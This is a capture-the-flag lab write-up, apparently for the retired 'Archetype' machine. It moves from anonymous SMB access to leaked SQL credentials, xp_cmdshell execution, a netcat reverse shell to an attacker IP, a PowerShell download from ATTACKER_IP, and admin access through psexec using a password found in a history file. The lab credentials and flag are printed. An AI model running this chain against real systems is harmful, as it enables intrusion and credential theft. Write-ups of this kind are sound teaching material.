First is to do a `smbclient`

```
└─# smbclient -L /10.129.165.52/     
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

THen we will check the `backups` folder

```
└─# smbclient //10.129.165.52/backups
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 06:20:57 2020
  ..                                  D        0  Mon Jan 20 06:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020

                5056511 blocks of size 4096. 2615814 blocks available
smb: \> 
```

We cna use `GET` command to download the file

```
get prod.dtsConfig
```

Opening the file, we can see a service account.

```
└─# cat prod.dtsConfig                                                
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We can then use `msfconsole` to get RCE.

```
use auxiliary/admin/mssql/mssql_exec
msf6 auxiliary(admin/mssql/mssql_exec) > options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting               Required  Description
   ----                 ---------------               --------  -----------
   CMD                  c:\Users\Public\nc.exe -e cm  no        Command to execute
                        d.exe 10.10.14.215 9001
   PASSWORD             M3g4c0rp123                   no        The password for the specified username
   RHOSTS               10.129.165.52                 yes       The target host(s), see https://docs.metasploit.co
                                                                m/docs/using-metasploit/basics/using-metasploit.ht
                                                                ml
   RPORT                1433                          yes       The target port (TCP)
   TDSENCRYPTION        false                         yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                   yes       Technique to use for command execution (Accepted:
                                                                xp_cmdshell, sp_oacreate)
   USERNAME             sql_svc                       no        The username to authenticate as
   USE_WINDOWS_AUTHENT  true                          yes       Use windows authentification (requires DOMAIN opti
                                                                on set)
```

We then can upload and use `nc.exe` to get a reverse shell.

To use `wget` command to download files from our machine.

`powershell.exe wget http://ATTACKER_IP:PORT/FILENAME -OutFile FILENAME`

We then cause `WinPEASx64.exe` (https://github.com/carlospolop/PEASS-ng/releases/tag/20231015-0ad0e48c) to check any thing that we can use to escalate or privilege.

We see an admin credential on this location

`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```
PS C:\users\sql_svc\AppData\Roaming\Microsoft\WIndows\PowerSHell\PSReadLine> type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

We then can use `psexec.py` to connect to the machine as the administrator.

```
(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# python3 psexec.py administrator@10.129.165.52
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.165.52.....
[*] Found writable share ADMIN$
[*] Uploading file kAEkujWp.exe
[*] Opening SVCManager on 10.129.165.52.....
[*] Creating service tcEU on 10.129.165.52.....
[*] Starting service tcEU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

 Directory of c:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,714,374,144 bytes free

c:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
c:\Users\Administrator\Desktop> 
```
